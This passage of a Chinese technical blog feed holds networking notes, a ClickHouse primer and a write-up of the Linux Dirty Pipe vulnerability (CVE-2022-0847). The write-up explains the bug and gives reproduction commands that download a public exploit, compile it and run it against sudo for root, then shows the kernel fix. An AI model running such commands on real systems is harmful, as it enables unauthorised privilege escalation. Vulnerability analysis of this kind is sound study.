class="headerlink" title="网络地址转换（NAT）"></a>网络地址转换（NAT）</h2><p>由于 IPv4 地址资源有限，大多数家庭或公司网络使用 NAT 技术让<strong>多个内网设备共享一个公网 IP</strong>。</p><p>常见的 NAT 类型：</p><ul><li>静态 NAT：一对一映射，适合需要被外网访问的服务</li><li>动态 NAT：从公网 IP 池中动态分配</li><li>PAT（端口地址转换）：最常见形式，也称为 NAPT，让多个内网设备共用同一个公网 IP，通过端口区分不同连接</li></ul><p>NAT 极大地缓解了地址资源紧张问题，但也带来了一些限制，例如 P2P 通信受阻、端到端加密挑战等。</p><hr><h1 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h1><h2 id="数据链路层的作用"><a href="#数据链路层的作用" class="headerlink" title="数据链路层的作用"></a>数据链路层的作用</h2><p>数据链路层位于网络层之下，主要职责是在<strong>同一链路内的两个节点之间可靠地传输数据帧</strong>。它不关心数据从哪台主机来，也不关心去往哪里，它只处理“从这一跳送到下一跳”。</p><p>网络通信过程中，每经过一个路由器，数据链路层的链路就会断开并重新建立。因此，数据链路层的通信是<strong>逐段进行的</strong>，而非端到端。</p><hr><h2 id="MAC-地址与链路标识"><a href="#MAC-地址与链路标识" class="headerlink" title="MAC 地址与链路标识"></a>MAC 地址与链路标识</h2><p>数据链路层使用 MAC 地址（Media Access Control Address）作为主机的唯一标识。每个网卡在出厂时都会被烧录一个唯一的 48 位地址，一般用十六进制表示，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00:1A:2B:3C:4D:5E</span><br></pre></td></tr></table></figure><p>MAC 地址工作在局域网范围，不能跨越路由器。而 IP 地址是逻辑地址，可以通过网络层路由转发。</p><p>MAC 地址在以太网通信中扮演“收件人”和“寄件人”的角色。网络设备通过 MAC 地址找到数据帧的目标主机。</p><hr><h2 id="以太网帧的结构"><a href="#以太网帧的结构" class="headerlink" title="以太网帧的结构"></a>以太网帧的结构</h2><p>以太网是最常见的链路层协议，它定义了数据帧的格式和传输方式。标准以太网帧结构如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">+----------------+----------------+-------------+---------------+-------------+</span><br><span class="line">|  目的 MAC 地址  |  源 MAC 地址   |  类型字段    |  数据（Payload） |  CRC 校验值   |</span><br><span class="line">+----------------+----------------+-------------+---------------+-------------+</span><br></pre></td></tr></table></figure><ul><li><strong>目的 MAC 地址</strong>：目标设备的地址</li><li><strong>源 MAC 地址</strong>：发送设备的地址</li><li><strong>类型字段</strong>：指出上层协议（如 0x0800 表示 IP 协议）</li><li><strong>数据部分</strong>：封装上层传输层或网络层的数据</li><li><strong>CRC 校验</strong>：用于检测数据在传输中是否被篡改</li></ul><p>每个数据帧最大传输单元（MTU）通常为 1500 字节，超出部分需要网络层进行分片。</p><hr><h2 id="ARP-协议实现地址解析"><a href="#ARP-协议实现地址解析" class="headerlink" title="ARP 协议实现地址解析"></a>ARP 协议实现地址解析</h2><p>ARP（Address Resolution Protocol）是数据链路层与网络层之间的桥梁，用于将 IP 地址解析为 MAC 地址。</p><h3 id="典型的-ARP-流程"><a href="#典型的-ARP-流程" class="headerlink" title="典型的 ARP 流程"></a>典型的 ARP 流程</h3><ol><li>主机 A 想发送数据给主机 B，只知道 B 的 IP 地址</li><li>A 在局域网广播 ARP 请求，询问“谁是这个 IP？”</li><li>B 收到后，发送 ARP 回复，告知自己的 MAC 地址</li><li>A 将 B 的 MAC 地址缓存在 ARP 表中，用于后续通信</li></ol><p>这种机制是动态的，ARP 缓存会在一段时间后过期并重新解析。</p><hr><h2 id="广播、单播与多播的区别"><a href="#广播、单播与多播的区别" class="headerlink" title="广播、单播与多播的区别"></a>广播、单播与多播的区别</h2><p>链路层通信模式有三种：</p><ul><li><strong>单播（Unicast）</strong>：点对点通信，只发给目标 MAC 地址</li><li><strong>广播（Broadcast）</strong>：发给局域网内所有设备，MAC 地址为 <code>FF:FF:FF:FF:FF:FF</code></li><li><strong>多播（Multicast）</strong>：发给特定一组设备，MAC 地址以 <code>01:00:5E</code> 开头</li></ul><p>ARP 请求就是典型的广播形式，DHCP 请求、网络发现等服务也常用广播或多播机制。</p><hr><h2 id="交换机的基本工作原理"><a href="#交换机的基本工作原理" class="headerlink" title="交换机的基本工作原理"></a>交换机的基本工作原理</h2><p>交换机是工作在数据链路层的核心设备。它通过维护一个<strong>MAC 地址表</strong>，实现高效的帧转发。</p><p>工作流程如下：</p><ol><li>交换机收到一个数据帧，记录其源 MAC 与入口端口</li><li>查找目的 MAC 是否已在表中<ul><li>有：直接将数据帧发到对应端口</li><li>没有：广播给所有端口（除接收端），等待目的主机响应</li></ul></li></ol><p>交换机比集线器更智能，能够避免不必要的广播，提高网络性能。</p><hr><h2 id="集线器的基本工作原理"><a href="#集线器的基本工作原理" class="headerlink" title="集线器的基本工作原理"></a>集线器的基本工作原理</h2><p>集线器的工作原理可以理解为一个非常简单的“广播”设备。当一个设备发送数据到集线器时，集线器会将数据传递给所有其他连接到它的设备，而不是根据目标地址将数据发送给特定的设备。这意味着集线器没有智能化地判断哪些设备应该接收数据，它只是将接收到的数据广播到所有端口。</p><hr><h2 id="VLAN-与链路层隔离机制"><a href="#VLAN-与链路层隔离机制" class="headerlink" title="VLAN 与链路层隔离机制"></a>VLAN 与链路层隔离机制</h2><p>VLAN（Virtual LAN）是一种逻辑上的网络隔离方式，可以将不同物理位置的主机划分到同一个逻辑广播域中。</p><p>通过给以太网帧增加 VLAN Tag，可以将网络划分为多个逻辑子网，达到以下目的：</p><ul><li>控制广播范围</li><li>提升网络安全</li><li>简化网络管理</li></ul><p>VLAN 是一种链路层技术，但其配置依赖交换机对 802.1Q 协议的支持。</p><hr><h2 id="数据链路层中的错误检测"><a href="#数据链路层中的错误检测" class="headerlink" title="数据链路层中的错误检测"></a>数据链路层中的错误检测</h2><p>数据链路层不保证数据可靠，但会尽力发现错误并丢弃异常帧。其中最常见的机制是：</p><ul><li><strong>CRC 校验</strong>：帧末尾附加校验值，用于检测传输过程中的比特错误</li><li><strong>帧长检查</strong>：非法帧长通常直接丢弃</li><li><strong>MAC 地址过滤</strong>：不符合地址匹配的帧会被忽略</li></ul><p>但需要注意的是，链路层不会自动重传数据，重传逻辑通常由传输层（如 TCP）来完成。</p><hr><h2 id="广播风暴"><a href="#广播风暴" class="headerlink" title="广播风暴"></a>广播风暴</h2><p>一些协议或服务（例如 ARP 请求、DHCP 发现请求）会产生广播数据包。如果网络中没有有效的流量控制或广播限制，可能导致广播包递归传播，形成<strong>广播风暴</strong>。</p><p><strong>生成树协议（STP）</strong> 是一种网络协议，用于防止交换机网络中的环路。STP 通过关闭某些冗余路径，确保在网络中没有环路，从而避免广播风暴的发生。</p><hr><h1 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h1><h2 id="物理层的作用"><a href="#物理层的作用" class="headerlink" title="物理层的作用"></a>物理层的作用</h2><p>物理层处于网络模型的最底层，负责将比特流（0 和 1）通过各种物理媒介在设备之间传输。它不关心数据的格式、结构和含义，只关注<strong>如何把 0 和 1 表示成物理信号</strong>，并尽可能地准确传送到接收端。</p><p>简单来说，物理层就是在解决“如何把数据发出去”，包括电缆、网卡、光纤、无线信号等。</p><hr><h2 id="比特传输与编码方式"><a href="#比特传输与编码方式" class="headerlink" title="比特传输与编码方式"></a>比特传输与编码方式</h2><p>数据在物理层以比特（bit）为单位传输。传输方式有很多种，不同场景使用的编码方式可能不同：</p><ul><li><strong>非归零编码（NRZ）</strong>：高电平表示 1，低电平表示 0</li><li><strong>曼彻斯特编码</strong>：用电平跳变表示比特，抗干扰能力更强</li><li><strong>基带传输与宽带传输</strong>：直接调制与间接调制的区别</li></ul><p>传输的信号可以是：</p><ul><li>电信号（双绞线、同轴电缆）</li><li>光信号（光纤）</li><li>无线电波（Wi-Fi、蓝牙）</li></ul><p>这些信号的生成、放大、转换与传输都归属物理层。</p><hr><h2 id="传输介质的类型"><a href="#传输介质的类型" class="headerlink" title="传输介质的类型"></a>传输介质的类型</h2><p>物理层涉及的传输介质通常有以下几种：</p><h3 id="双绞线（Twisted-Pair）"><a href="#双绞线（Twisted-Pair）" class="headerlink" title="双绞线（Twisted Pair）"></a>双绞线（Twisted Pair）</h3><p>最常用的网线类型，如 CAT5e、CAT6。其内部由成对缠绕的铜线构成，用于抵消电磁干扰。支持百兆、千兆、万兆等传输速率。</p><h3 id="光纤（Fiber-Optic）"><a href="#光纤（Fiber-Optic）" class="headerlink" title="光纤（Fiber Optic）"></a>光纤（Fiber Optic）</h3><p>以光信号方式传输数据，传输速率极高、距离远、抗干扰能力强。分为单模光纤和多模光纤，广泛用于数据中心与骨干网。</p><h3 id="同轴电缆（Coaxial-Cable）"><a href="#同轴电缆（Coaxial-Cable）" class="headerlink" title="同轴电缆（Coaxial Cable）"></a>同轴电缆（Coaxial Cable）</h3><p>早期局域网中常用的介质，现在主要用于有线电视网络。结构上有良好的屏蔽层，但已不常用于现代以太网。</p><h3 id="无线传输"><a href="#无线传输" class="headerlink" title="无线传输"></a>无线传输</h3><p>包括 Wi-Fi、蓝牙、蜂窝通信等，使用射频方式进行比特传输。属于物理层的无线信号载波，与链路层的无线协议配合使用。</p><hr><h2 id="常见接口标准"><a href="#常见接口标准" class="headerlink" title="常见接口标准"></a>常见接口标准</h2><p>物理层的另一个重要部分是定义硬件接口标准，这些标准规定了：</p><ul><li>电压水平</li><li>接口形状</li><li>速率规范</li><li>引脚定义</li></ul><p>常见接口包括：</p><ul><li><strong>RJ45</strong>：以太网常用接口</li><li><strong>光纤接头（如 SC、LC）</strong>：用于光纤通信</li><li><strong>USB、HDMI、Serial Port</strong>：部分接口标准也涵盖物理层定义</li><li><strong>802.11 系列标准</strong>：Wi-Fi 的物理层和链路层协议合集</li></ul><hr><h2 id="信号传输中的干扰与失真"><a href="#信号传输中的干扰与失真" class="headerlink" title="信号传输中的干扰与失真"></a>信号传输中的干扰与失真</h2><p>物理层传输的信号可能受到多种干扰：</p><ul><li><strong>串扰</strong>：相邻线路之间的电磁干扰</li><li><strong>噪声</strong>：来自电源、无线电、机械等外部环境的干扰</li><li><strong>衰减</strong>：信号随着距离的增加而变弱</li><li><strong>反射与回波</strong>：不良接头或阻抗不匹配导致信号反弹</li></ul><p>为了减少这些问题，通常需要配合屏蔽电缆、信号放大器、调制器等硬件设施。</p><hr><h2 id="传输速率与带宽概念"><a href="#传输速率与带宽概念" class="headerlink" title="传输速率与带宽概念"></a>传输速率与带宽概念</h2><p>物理层中常涉及两个容易混淆的术语：</p><ul><li><strong>带宽（Bandwidth）</strong>：表示信道理论上能承载的频率范围，单位为 Hz</li><li><strong>速率（Data Rate）</strong>：表示单位时间传输的比特数量，单位为 bps（bit per second）</li></ul><p>带宽越高，理论上的数据传输能力越强。但最终的传输速率还受到调制方式、信噪比、协议效率等多种因素影响。</p><p>例如：</p><ul><li>100BASE-T：百兆以太网，最大 100 Mbps</li><li>1000BASE-T：千兆以太网，最大 1000 Mbps</li><li>10GBASE-SR：万兆光纤网络</li></ul><hr><h2 id="调制解调的基本概念"><a href="#调制解调的基本概念" class="headerlink" title="调制解调的基本概念"></a>调制解调的基本概念</h2><p>在一些物理层实现中（尤其是模拟线路），比特信号不能直接传输，需要通过<strong>调制</strong>技术将数字信号转换为模拟信号，接收端再进行<strong>解调</strong>。</p><p>典型例子是电话线使用的 ADSL、早期拨号上网使用的调制解调器（Modem）：</p><ul><li><strong>调制（Modulation）</strong>：将数字信号嵌入到载波中传输</li><li><strong>解调（Demodulation）</strong>：从接收到的信号中还原出原始比特流</li></ul><p>虽然在现代局域网中调制已不常见，但在广域网、无线通信中仍然广泛使用。</p><hr><h1 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h1><p>可以将五层模型简单地图示如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">应用层       ← 提供网络应用服务（如网页、邮件）</span><br><span class="line">传输层       ← 端到端通信，确保可靠或快速传输</span><br><span class="line">网络层       ← 跨网络寻址与路由，主机之间建立路径</span><br><span class="line">数据链路层   ← 相邻设备之间的数据帧传输（同一个链路）</span><br><span class="line">物理层       ← 0 和 1 的物理信号化与真实传输</span><br></pre></td></tr></table></figure><p>数据在发送时是自上而下封装的，从应用层逐层打包，到物理层转成信号发出；接收时则反过来，从物理层接收信号，逐层还原数据直到应用层。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;计算机网络是一组通过通信链路互相连接的计算设备，它们之间可以进行数据传输、信息共享与远程控制。现在使用的手机、电脑和服务器之间的所有数据交换</summary>
      
    
    
    
    
    <category term="网络" scheme="https://lyi61pd.github.io/tags/%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2022-0847</title>
    <link href="https://lyi61pd.github.io/2025/04/11/CVE-2022-0847/"/>
    <id>https://lyi61pd.github.io/2025/04/11/CVE-2022-0847/</id>
    <published>2025-04-11T00:00:00.000Z</published>
    <updated>2025-07-30T03:40:55.099Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CVE-2022-0847"><a href="#CVE-2022-0847" class="headerlink" title="CVE-2022-0847"></a>CVE-2022-0847</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><h4 id="管道-pipe"><a href="#管道-pipe" class="headerlink" title="管道(pipe)"></a>管道(pipe)</h4><p>pipe是linux内核提供的一个通信管道，可以通过pipe()函数创建，通过pipe()函数可以获取到两个文件描述符，分别负责接受数据和发送数据。pipe是以页的形式进行管理，通常pipe缓存空间总长度为65536字节，也就是16页,16个页以数组的方式进行存储，组成一个环形链表的结构(pipe-&gt;bufs[0]~pipe-&gt;bufs[15])，pipe有两个链表指针，一个负责写(pipe-&gt;head)，一个用来读(pipe-&gt;tail)。</p><p>通过对pipe进行写操作时，会调用到pipe的pipe_write()函数，下面主要对该函数进行简单介绍：<br>该函数中存在两个逻辑：</p><ol><li>如果当前负责写的链表指针(pipe-&gt;head)指向的页的flags标志位存在PIPE_BUF_FLAG_CAN_MERGE，并且写入指定长度后不会出现跨页，那么就会继续往这个页中写入数据。</li><li>如果不能在当前页续写，就会重新申请一个页，并且新页的flags标志位默认初始化为PIPE_BUF_FLAG_CAN_MERGE<br>至于为什么第二点要把新页的flags标志位默认初始化为PIPE_BUF_FLAG_CAN_MERGE，因为对于pipe来说，默认状态下是允许对页进行续写的，这样可以节省空间。</li></ol><h4 id="Linux内核page-cache机制"><a href="#Linux内核page-cache机制" class="headerlink" title="Linux内核page cache机制"></a>Linux内核page cache机制</h4><p>linux 文件缓存页(page cache)是Linux内核中用于缓存文件系统数据的一种机制，当一个进程访问一个文件时，内核会首先检查这个文件是否已经被缓存到页缓存中。如果文件已经被缓存，则内核会直接从页缓存中读取数据并返回给进程，避免了从磁盘中读取数据的开销。如果文件没有被缓存，则内核会将文件的数据读取到页缓存中，并从缓存中返回数据给进程，以提高性能。文件缓存页会在内核层的内存中存留一段时间(可能会一直持续到下次重启电脑)。</p><h4 id="splice-系统调用"><a href="#splice-系统调用" class="headerlink" title="splice()系统调用"></a>splice()系统调用</h4><p>splice()系统调用是零拷贝技术的其中一种，可以自行学习零拷贝相关知识，但在此处对理解漏洞影响不大。<br>splice零拷贝的方式就是，直接让pipe的缓存页指向文件缓存页，也就是使pipe-&gt;bufs[x]-&gt;page直接指向page cache。<br>这一部分主要由splice()系统调用下的copy_page_to_iter_pipe()函数来实现<br>但是copy_page_to_iter_pipe()函数中，在将pipe的缓存页指向文件缓存页后，并没有把pipe的缓存页的flags标志位初始化，形成了一个未初始化漏洞。</p><h4 id="漏洞场景"><a href="#漏洞场景" class="headerlink" title="漏洞场景"></a>漏洞场景</h4><p>为什么说这是一个漏洞？考虑这样一个情景：</p><ul><li>申请一个pipe，并且向其中写入数据，把pipe的16个页全部写满一遍，那么根据pipe的pipe_write()函数的第二个逻辑，整个pipe的16个缓存页的flags标志位都会设置PIPE_BUF_FLAG_CAN_MERGE</li><li>再通过读操作，把pipe的全部内容读取一遍，此时pipe将会被认定为一个空的管道(pipe是一个环形链表，全部读一遍之后两个链表指针又回到了初始状态)，但是pipe中的16个缓存页的flags标志位依旧设置有PIPE_BUF_FLAG_CAN_MERGE，并没有被清除掉。</li><li>然后通过splice()系统调用，将文件A的文件缓存页传递给pipe的缓存页，假设该pipe的缓存页为pipe-&gt;bufs[2]，那么此时pipe-bufs[2]的flags依旧设置有PIPE_BUF_FLAG_CAN_MERGE，也就是说，如果继续向pipe写入数据，并且写入数据长度不会出现跨页的情况，就能继续向bufs[2]里续写，尽管bufs[2]此刻已被判断为是文件A</li><li>继续向pipe中写入一段数据，只要写入的长度不会导致跨页，就会直接对内核中的文件缓存页的内容进行修改，之后如果访问文件A，那么根据Linux内核page cache机制，将会直接获取到内存中的文件A的内容。相当于实现了对可读文件暂时性的任意写的功能。</li></ul><p>其实上述的情景就是一些EXP的攻击思路了，如果能够理解这个情景将会对之后理解EXP有很大帮助。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://haxx.in/files/dirtypipez.c</span><br><span class="line">gcc dirtypipez.c -o dirtypipez</span><br><span class="line">./dirtypipez `which sudo`</span><br></pre></td></tr></table></figure><h3 id="漏洞利用脚本分析"><a href="#漏洞利用脚本分析" class="headerlink" title="漏洞利用脚本分析"></a>漏洞利用脚本分析</h3><p>查看<code>https://haxx.in/files/dirtypipez.c</code>的源码进行分析：</p><p>prepare_pipe()函数负责将pipe的全部缓存页的flags设置PIPE_BUF_FLAG_CAN_MERGE,其实就是做了上述情景的前两步<br>hax()函数负责向指定文件写入指定的内容，其思路与上述情景一致<br>通过向具有SUID特权位的文件(这也是使用which sudo作为参数的原因)写入内容，然后执行，实现任意代码执行的效果。</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>漏洞根本原因在于splice()系统调用的copy_page_to_iter_pipe()函数没有初始化flags，因此在其中加入这样一行代码即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buf-&gt;flags=0;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;CVE-2022-0847&quot;&gt;&lt;a href=&quot;#CVE-2022-0847&quot; class=&quot;headerlink&quot; title=&quot;CVE-2022-0847&quot;&gt;&lt;/a&gt;CVE-2022-0847&lt;/h2&gt;&lt;h3 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot;</summary>
      
    
    
    
    
    <category term="漏洞分析" scheme="https://lyi61pd.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    <category term="漏洞复现" scheme="https://lyi61pd.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Linux Kernel" scheme="https://lyi61pd.github.io/tags/Linux-Kernel/"/>
    
  </entry>
  
  <entry>
    <title>Clickhouse</title>
    <link href="https://lyi61pd.github.io/2025/04/11/Clickhouse/"/>
    <id>https://lyi61pd.github.io/2025/04/11/Clickhouse/</id>
    <published>2025-04-11T00:00:00.000Z</published>
    <updated>2025-07-30T03:40:55.099Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ClickHouse的架构与设计理念"><a href="#ClickHouse的架构与设计理念" class="headerlink" title="ClickHouse的架构与设计理念"></a>ClickHouse的架构与设计理念</h1><h2 id="ClickHouse的整体架构概览"><a href="#ClickHouse的整体架构概览" class="headerlink" title="ClickHouse的整体架构概览"></a>ClickHouse的整体架构概览</h2><p>ClickHouse 是一个开源的列式数据库，由 Yandex 开发，专为 <strong>在线分析处理（OLAP）</strong> 场景而设计。它的架构设计强调 <strong>高吞吐、低延迟</strong> 和 <strong>可横向扩展</strong>。</p><p><strong>架构核心组件</strong></p><ol><li><strong>Server 节点</strong><ul><li>ClickHouse 的基本运行单位是一个服务进程（通常是一个 <code>clickhouse-server</code> 实例），它负责处理客户端请求、执行查询、管理存储等。</li></ul></li><li><strong>表引擎（Table Engines）</strong><ul><li>表的存储和管理依赖引擎，最核心的是 <strong>MergeTree</strong> 及其衍生类型（如 ReplacingMergeTree、SummingMergeTree）。</li><li>每种引擎定义了数据如何存储、如何合并、如何处理TTL等规则。</li></ul></li><li><strong>查询引擎（Query Processor）</strong><ul><li>查询经过解析器 → 分析器 → 优化器 → 执行器的层层处理。</li><li>查询最终会被向量化处理，高效执行。</li></ul></li><li><strong>分布式支持</strong><ul><li>通过 <code>Distributed</code> 表引擎实现横向扩展，支持分布式存储与查询。</li><li>使用 <code>ZooKeeper</code> 协调副本、分片、故障恢复。</li></ul></li><li><strong>系统表（system. 系列）</strong><ul><li>ClickHouse内部维护了大量系统表，可用于监控、诊断、调优。</li></ul></li></ol><hr><h2 id="列式数据库的设计理念与优势"><a href="#列式数据库的设计理念与优势" class="headerlink" title="列式数据库的设计理念与优势"></a>列式数据库的设计理念与优势</h2><p>ClickHouse 是列式存储的数据库，这意味着它将每一列的数据单独存储在磁盘上，而不是传统行式数据库那样按行存储。</p><p><strong>优势包括：</strong></p><ul><li><strong>更高的压缩率</strong>：同一列中的数据类型一致，便于压缩算法发挥最大效能。</li><li><strong>更快的读取速度</strong>：只读取查询涉及的列，IO 开销极低。</li><li><strong>高效的向量化计算</strong>：将列数据作为批处理单位，提升 CPU 使用效率。</li></ul><hr><h2 id="MergeTree-表引擎基础概念"><a href="#MergeTree-表引擎基础概念" class="headerlink" title="MergeTree 表引擎基础概念"></a>MergeTree 表引擎基础概念</h2><p>MergeTree 是 ClickHouse 中最重要的表引擎，几乎所有的功能（如排序键、TTL、物化视图）都建立在它之上。</p><p><strong>核心特性：</strong></p><ul><li><strong>分区（partition by）</strong>：将数据按照某个维度分区管理，提高查询效率与数据管理灵活性。</li><li><strong>主键（order by）</strong>：数据在写入时按照主键进行有序组织，支持范围查找和跳跃索引,。</li><li><strong>数据分片（parts）</strong>：数据不是整体存储，而是以“Part”为单位增量写入。</li><li><strong>后台合并（Merge）</strong>：ClickHouse定期将小的Part合并为大的Part，优化读取性能和空间利用率。</li></ul><hr><h1 id="Clickhouse的主键与Mysql的主键的区别"><a href="#Clickhouse的主键与Mysql的主键的区别" class="headerlink" title="Clickhouse的主键与Mysql的主键的区别"></a>Clickhouse的主键与Mysql的主键的区别</h1><p>在 <strong>ClickHouse</strong> 和 <strong>MySQL</strong> 中，主键的概念有所不同，因为这两个数据库系统的设计目标和架构有所区别。虽然两者的主键都用于唯一标识记录，但它们的实现方式和作用有所不同。</p><h2 id="MySQL-主键"><a href="#MySQL-主键" class="headerlink" title="MySQL 主键"></a>MySQL 主键</h2><ol><li><strong>定义</strong>：<ul><li>在 <strong>MySQL</strong> 中，主键是一个或多个列的组合，用于唯一标识表中的每一行记录。主键必须是唯一的，并且不能为 <strong>NULL</strong>。</li></ul></li><li><strong>存储与索引</strong>：<ul><li>在 <strong>MySQL</strong> 中，主键不仅是唯一标识符，它还会自动创建一个 <strong>聚簇索引（Clustered Index）</strong>。这意味着数据行会按照主键的顺序存储在磁盘上，主键的顺序决定了物理存储的顺序。</li><li>如果主键由多个列组成，那么这些列的组合会共同决定记录在数据库中的存储顺序。</li></ul></li><li><strong>索引类型</strong>：<ul><li>MySQL 的主键通常是基于 <strong>B+树索引</strong>，适合高效的范围查询和单个记录的查找。B+树索引使得在查找时可以快速定位到对应的行。</li></ul></li><li><strong>作用</strong>：<ul><li><strong>唯一性</strong>：主键确保每一行数据在表中的唯一性。</li><li><strong>查询效率</strong>：由于主键是聚簇索引，它可以显著提高查询性能，尤其是通过主键查找记录时。</li></ul></li></ol><h2 id="ClickHouse-主键"><a href="#ClickHouse-主键" class="headerlink" title="ClickHouse 主键"></a>ClickHouse 主键</h2><ol><li><strong>定义</strong>：<ul><li>在 <strong>ClickHouse</strong> 中，主键并不像传统数据库（如 MySQL）那样是唯一约束的索引。ClickHouse 的主键主要用于数据的 <strong>排序</strong>，而不是用于唯一性约束。</li><li>主键是通过 <code>ORDER BY</code> 子句定义的，用来指定数据在存储时的排序顺序。数据并不要求唯一，主键更多的是决定存储方式，以优化查询性能。</li></ul></li><li><strong>存储与索引</strong>：<ul><li>在 <strong>ClickHouse</strong> 中，表中的数据并不按主键的顺序存储，而是按照 <strong>MergeTree</strong> 引擎的排序规则存储。通过主键指定的排序列决定了数据的 <strong>物理存储顺序</strong>，这有助于优化按这些列进行的查询。</li><li><strong>ClickHouse</strong> 的主键不会像 MySQL 那样创建聚簇索引。ClickHouse 的 <strong>MergeTree</strong> 引擎使用 <strong>数据部分（parts）</strong> 来存储数据，并通过索引文件（primary key index）来加速查询。</li></ul></li><li><strong>索引类型</strong>：<ul><li><strong>ClickHouse</strong> 使用的是 <strong>稀疏索引</strong>（Sparse Index），它与 B+ 树的传统索引不同。ClickHouse 通过在数据块中存储列的最小值和最大值来构建索引，以优化范围查询。主键定义了如何在这些数据块中进行查询和定位。</li></ul></li><li><strong>作用</strong>：<ul><li><strong>排序优化</strong>：主键的定义帮助 ClickHouse 对数据进行排序，这对于按排序列进行的范围查询非常有效。</li><li><strong>没有唯一性约束</strong>：与 MySQL 的主键不同，ClickHouse 中的主键并不强制保证唯一性，它仅用于优化查询。</li><li><strong>性能优化</strong>：主键列通常是查询中常用的列，特别是当这些列用于 <code>ORDER BY</code> 或 <code>WHERE</code> 子句时，排序和索引能够大幅提升查询性能。</li></ul></li></ol><h2 id="主要区别"><a href="#主要区别" class="headerlink" title="主要区别"></a>主要区别</h2><ol><li><strong>唯一性</strong>：<ul><li><strong>MySQL</strong>：主键必须唯一，并且每个表只能有一个主键。</li><li><strong>ClickHouse</strong>：主键不保证唯一性，它只用于数据的排序优化，不强制要求唯一。</li></ul></li><li><strong>物理存储</strong>：<ul><li><strong>MySQL</strong>：主键对应的列会影响物理存储顺序，因为主键是聚簇索引，数据行存储的顺序与主键顺序一致。</li><li><strong>ClickHouse</strong>：主键影响数据的排序顺序，但不控制数据的物理存储顺序。主键只是优化查询的一个手段，数据本身并不要求按照主键排序存储。</li></ul></li><li><strong>索引结构</strong>：<ul><li><strong>MySQL</strong>：主键使用<strong>聚簇索引</strong>，基于 B+ 树，适用于范围查询和精确查找。</li><li><strong>ClickHouse</strong>：主键使用<strong>稀疏索引</strong>，并通过 <code>MergeTree</code> 引擎优化数据分布，更多的是用于查询优化而不是唯一性验证。</li></ul></li><li><strong>查询性能</strong>：<ul><li><strong>MySQL</strong>：由于主键的聚簇索引，MySQL 对主键相关查询非常高效，特别是精确查找。</li><li><strong>ClickHouse</strong>：主键通过控制数据的物理排序来优化范围查询和批量数据访问，特别是在按主键排序的查询中，性能有显著提升。</li></ul></li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li><strong>MySQL</strong> 的主键主要是用来保证数据的唯一性，并且通过聚簇索引加速查询。</li><li><strong>ClickHouse</strong> 的主键并不要求唯一性，而是主要用于 <strong>数据排序</strong> 和 <strong>查询优化</strong>，特别是在使用 <code>MergeTree</code> 引擎时，通过主键来定义数据的存储顺序，优化范围查询。</li></ul><hr><h1 id="底层数据结构"><a href="#底层数据结构" class="headerlink" title="底层数据结构"></a>底层数据结构</h1><h2 id="ClickHouse-的列式存储格式"><a href="#ClickHouse-的列式存储格式" class="headerlink" title="ClickHouse 的列式存储格式"></a>ClickHouse 的列式存储格式</h2><p>ClickHouse 是原生的列式数据库，它将每一列的数据单独存储为多个文件，而不是一整行。</p><hr><p><strong>每列的数据存储结构</strong></p><p>对于每个字段，ClickHouse 可能生成如下几种文件（以 MergeTree 表为例）：</p><ul><li><code>.bin</code>（或无后缀）：列的实际数据文件（经过编码与压缩）</li><li><code>.mrk3</code>：<strong>mark文件</strong>，用于快速定位数据块中的位置</li><li><code>.idx</code>（bitmap索引等引擎特有）：</li><li><code>.default</code>：记录 default 表达式结果（如果有）</li></ul><p>这些文件按列存储，并以 <strong>part</strong> 为单位组织在磁盘上。每个 part 包含所有列的若干数据段。</p><hr><h2 id="数据组织单位：Part"><a href="#数据组织单位：Part" class="headerlink" title="数据组织单位：Part"></a>数据组织单位：Part</h2><p>ClickHouse 的写入不是直接追加数据，而是每次写入都会生成一个新的 <strong>Part</strong>。</p><hr><p><strong>Part 的核心特点：</strong></p><ul><li>是不可变的（immutable）</li><li>存储在磁盘上一个独立的目录中</li><li>包含分区信息、索引、数据列文件、元数据文件</li><li>文件结构：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">all_0_0_0/</span><br><span class="line">  columns.txt</span><br><span class="line">  primary.idx</span><br><span class="line">  checksums.txt</span><br><span class="line">  data/</span><br><span class="line">    column1.bin, column1.mrk3</span><br><span class="line">    column2.bin, column2.mrk3</span><br></pre></td></tr></table></figure><hr><p><strong>Part 